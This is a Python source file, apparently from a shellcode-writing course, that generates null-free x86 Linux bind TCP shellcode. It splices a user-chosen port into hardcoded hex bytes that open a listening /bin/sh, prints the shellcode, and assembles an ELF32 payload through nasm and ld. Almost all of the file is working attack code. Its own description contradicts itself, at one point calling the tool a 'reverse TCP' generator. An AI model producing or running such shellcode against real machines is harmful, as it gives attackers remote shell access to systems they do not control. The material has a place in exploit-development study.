# Filename: gen_bind_tcp_shellcode.py
# Author: Upayan a.k.a. slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: This is a x86 Linux bind TCP null-free shellcode generator written in 
# Python3. The C2 Port is fed into the program and it spits out a 
# shellcode hex string and byte string and an ELF32 payload for Linux.
# Usage: python3 gen_bind_tcp_shellcode.py
# Note: A 4 digit C2 port number is required. Also, you need NASM installed 
# on the machine and install termcolor and pyfiglet python package for a cool look.
# Testing: ./shellcode_loader <paste generated shellcode here> OR ./bind_tcp_payload
# Size of shellcode: 82 bytes


from termcolor import colored
import pyfiglet
import sys
import os


def main():
	ascii_banner = pyfiglet.figlet_format("BindTCP Shellcode Generator")
	print(colored(ascii_banner, 'blue'))
	print("\n")
	print(colored("Author: Upayan a.k.a slaeryan", "blue"))
	print("\n")
	print(colored("Purpose: This is a x86 Linux bind TCP null-free shellcode generator written in Python3. The C2 Port is fed into the program and it     spits out a x68 reverse TCP shellcode hex string and byte string and an ELF32 payload for Linux." , "blue"))
	print("\n")
	print(colored("Note: A 4 digit C2 port number is required.", "blue"))
	print("\n")
	print(colored("Testing: ./shellcode_loader <paste generated shellcode here> OR ./bind_tcp_payload", "blue"))
	print("\n")
	shellcode = ''
	prependcode = "31c031db31c99966b86701b302b101cd8089c3526668"
	middlecode = "6668"
	c2_port_string = input(colored("Enter LPORT: ", "blue"))
	print("\n")
	c2_port_hex = ''
	c2_port_int = int(c2_port_string)
	c2_port_hex = hex(c2_port_int).split('x')[-1]
	#print(c2_port_hex)
	appendcode = "666a0266b8690189e1b210cd8066b86b0131c9cd8066b86c019931f6cd8089c3b103b03f49cd8075f952682f2f7368682f62696e89e3b00bcd80"
	shellcode = prependcode + c2_port_hex + appendcode
	if (len(shellcode)/2) != 82:
		print("[!] Error generating shellcode ...")
	else:
		print(colored("[+] Size of shellcode: 82 bytes", "blue"))
		print("\n")
		print(colored("[+] Shellcode in hex string: " + shellcode, "blue"))
		print("\n")
		shellcode_byte_string = ''
		counter = 1
		byte = ''
		for i in shellcode:
			if (counter % 2 == 0):
				byte = "\\x" + byte + i
				shellcode_byte_string = shellcode_byte_string + byte
				byte = ''
			else:
				byte = byte + i
			counter += 1
		print(str(colored("[+] Shellcode in byte string: " + shellcode_byte_string, "blue")))
		print("\n")
		prepend_command = "nasm -f elf32 -o bind_tcp_shellcode.o "
		c2_port_hex_rev = ''
		c2_port_hex_rev = c2_port_hex[2] + c2_port_hex[3] + c2_port_hex[0] + c2_port_hex[1]
		middle_command = " -DC2_PORT=0x" + c2_port_hex_rev
		append_command = " bind_tcp_shellcode.nasm"
		command = prepend_command + middle_command + append_command
		os.system(command)
		command = "ld -s -o bind_tcp_payload bind_tcp_shellcode.o"
		os.system(command)
		os.remove("bind_tcp_shellcode.o")
		print(colored("[+] Bind TCP payload generated", "blue"))
		print("\n")


main()